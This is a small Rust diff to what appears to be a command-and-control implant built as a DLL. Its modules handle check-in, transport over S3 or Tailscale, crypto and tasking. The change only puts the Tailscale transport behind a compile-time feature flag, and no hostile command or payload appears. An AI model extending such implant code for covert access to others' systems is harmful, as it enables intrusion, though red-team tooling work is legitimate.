@@ -2,6 +2,7 @@ mod config;
 mod checkin;
 mod transport;
 mod s3_transport;
+#[cfg(feature = "tailscale")]
 mod tailscale_transport;
 mod crypto;
 mod tasking;
@@ -46,6 +47,7 @@ pub extern "system" fn DllMain(
 
 fn run() {
     // Tailscale initialization (join tailnet before any communication)
+    #[cfg(feature = "tailscale")]
     if config::use_tailscale {
         loop {
             match tailscale_transport::init() {
